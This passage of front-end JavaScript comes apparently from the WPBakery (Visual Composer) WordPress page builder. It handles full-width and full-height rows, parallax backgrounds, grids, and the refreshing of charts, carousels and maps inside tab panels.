                location.href.indexOf("#!prettyPhoto") > -1 && (location.hash = "")
            },
            social_tools: ""
        })
    } catch (err) {
        window.console && window.console.log && console.log(err)
    }
}
),
"function" != typeof window.vc_google_fonts && (window.vc_google_fonts = function() {
    return !1
}
),
window.vcParallaxSkroll = !1,
"function" != typeof window.vc_rowBehaviour && (window.vc_rowBehaviour = function() {
    function fullWidthRow() {
        var $elements = $('[data-vc-full-width="true"]');
        $.each($elements, function(key, item) {
            var $el = $(this);
            $el.addClass("vc_hidden");
            var $el_full = $el.next(".vc_row-full-width");
            if ($el_full.length || ($el_full = $el.parent().next(".vc_row-full-width")),
            $el_full.length) {
                var el_margin_left = parseInt($el.css("margin-left"), 10)
                  , el_margin_right = parseInt($el.css("margin-right"), 10)
                  , offset = 0 - $el_full.offset().left - el_margin_left
                  , width = $(window).width();
                if ($el.css({
                    position: "relative",
                    left: offset,
                    "box-sizing": "border-box",
                    width: $(window).width()
                }),
                !$el.data("vcStretchContent")) {
                    var padding = -1 * offset;
                    0 > padding && (padding = 0);
                    var paddingRight = width - padding - $el_full.width() + el_margin_left + el_margin_right;
                    0 > paddingRight && (paddingRight = 0),
                    $el.css({
                        "padding-left": padding + "px",
                        "padding-right": paddingRight + "px"
                    })
                }
                $el.attr("data-vc-full-width-init", "true"),
                $el.removeClass("vc_hidden"),
                $(document).trigger("vc-full-width-row-single", {
                    el: $el,
                    offset: offset,
                    marginLeft: el_margin_left,
                    marginRight: el_margin_right,
                    elFull: $el_full,
                    width: width
                })
            }
        }),
        $(document).trigger("vc-full-width-row", $elements)
    }
    function fullHeightRow() {
        var $element = $(".vc_row-o-full-height:first");
        if ($element.length) {
            var $window, windowHeight, offsetTop, fullHeight;
            $window = $(window),
            windowHeight = $window.height(),
            offsetTop = $element.offset().top,
            offsetTop < windowHeight && (fullHeight = 100 - offsetTop / (windowHeight / 100),
            $element.css("min-height", fullHeight + "vh"))
        }
        $(document).trigger("vc-full-height-row", $element)
    }
    var $ = window.jQuery;
    $(window).off("resize.vcRowBehaviour").on("resize.vcRowBehaviour", fullWidthRow).on("resize.vcRowBehaviour", fullHeightRow),
    fullWidthRow(),
    fullHeightRow(),
    function() {
        (window.navigator.userAgent.indexOf("MSIE ") > 0 || navigator.userAgent.match(/Trident.*rv\:11\./)) && $(".vc_row-o-full-height").each(function() {
            "flex" === $(this).css("display") && $(this).wrap('<div class="vc_ie-flexbox-fixer"></div>')
        })
    }(),
    vc_initVideoBackgrounds(),
    function() {
        var vcSkrollrOptions, callSkrollInit = !1;
        window.vcParallaxSkroll && window.vcParallaxSkroll.destroy(),
        $(".vc_parallax-inner").remove(),
        $("[data-5p-top-bottom]").removeAttr("data-5p-top-bottom data-30p-top-bottom"),
        $("[data-vc-parallax]").each(function() {
            var skrollrSpeed, skrollrSize, skrollrStart, skrollrEnd, $parallaxElement, parallaxImage, youtubeId;
            callSkrollInit = !0,
            "on" === $(this).data("vcParallaxOFade") && $(this).children().attr("data-5p-top-bottom", "opacity:0;").attr("data-30p-top-bottom", "opacity:1;"),
            skrollrSize = 100 * $(this).data("vcParallax"),
            $parallaxElement = $("<div />").addClass("vc_parallax-inner").appendTo($(this)),
            $parallaxElement.height(skrollrSize + "%"),
            parallaxImage = $(this).data("vcParallaxImage"),
            youtubeId = vcExtractYoutubeId(parallaxImage),
            youtubeId ? insertYoutubeVideoAsBackground($parallaxElement, youtubeId) : void 0 !== parallaxImage && $parallaxElement.css("background-image", "url(" + parallaxImage + ")"),
            skrollrSpeed = skrollrSize - 100,
            skrollrStart = -skrollrSpeed,
            skrollrEnd = 0,
            $parallaxElement.attr("data-bottom-top", "top: " + skrollrStart + "%;").attr("data-top-bottom", "top: " + skrollrEnd + "%;")
        }),
        !(!callSkrollInit || !window.skrollr) && (vcSkrollrOptions = {
            forceHeight: !1,
            smoothScrolling: !1,
            mobileCheck: function() {
                return !1
            }
        },
        window.vcParallaxSkroll = skrollr.init(vcSkrollrOptions),
        window.vcParallaxSkroll)
    }()
}
),
"function" != typeof window.vc_gridBehaviour && (window.vc_gridBehaviour = function() {
    jQuery.fn.vcGrid && jQuery("[data-vc-grid]").vcGrid()
}
),
"function" != typeof window.getColumnsCount && (window.getColumnsCount = function(el) {
    for (var find = !1, i = 1; !1 === find; ) {
        if (el.hasClass("columns_count_" + i))
            return find = !0,
            i;
        i++
    }
}
);
var screen_size = getSizeName();
"function" != typeof window.wpb_prepare_tab_content && (window.wpb_prepare_tab_content = function(event, ui) {
    var $ui_panel, $google_maps, panel = ui.panel || ui.newPanel, $pie_charts = panel.find(".vc_pie_chart:not(.vc_ready)"), $round_charts = panel.find(".vc_round-chart"), $line_charts = panel.find(".vc_line-chart"), $carousel = panel.find('[data-ride="vc_carousel"]');
    if (vc_carouselBehaviour(),
    vc_plugin_flexslider(panel),
    ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").length && ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").each(function() {
        var grid = jQuery(this).data("vcGrid");
        grid && grid.gridBuilder && grid.gridBuilder.setMasonry && grid.gridBuilder.setMasonry()
    }),
    panel.find(".vc_masonry_media_grid, .vc_masonry_grid").length && panel.find(".vc_masonry_media_grid, .vc_masonry_grid").each(function() {
        var grid = jQuery(this).data("vcGrid");
        grid && grid.gridBuilder && grid.gridBuilder.setMasonry && grid.gridBuilder.setMasonry()
    }),
    $pie_charts.length && jQuery.fn.vcChat && $pie_charts.vcChat(),
    $round_charts.length && jQuery.fn.vcRoundChart && $round_charts.vcRoundChart({
        reload: !1
    }),
    $line_charts.length && jQuery.fn.vcLineChart && $line_charts.vcLineChart({
        reload: !1
    }),
    $carousel.length && jQuery.fn.carousel && $carousel.carousel("resizeAction"),
    $ui_panel = panel.find(".isotope, .wpb_image_grid_ul"),
    $google_maps = panel.find(".wpb_gmaps_widget"),
    0 < $ui_panel.length && $ui_panel.isotope("layout"),
    $google_maps.length && !$google_maps.is(".map_ready")) {
        var $frame = $google_maps.find("iframe");
        $frame.attr("src", $frame.attr("src")),
        $google_maps.addClass("map_ready")
    }
    panel.parents(".isotope").length && panel.parents(".isotope").each(function() {
        jQuery(this).isotope("layout")
    })
}
),
window.vc_googleMapsPointer,
jQuery(document).ready(vc_prepareHoverBox),
jQuery(window).resize(vc_prepareHoverBox),
jQuery(document).ready(function($) {
    window.vc_js()
});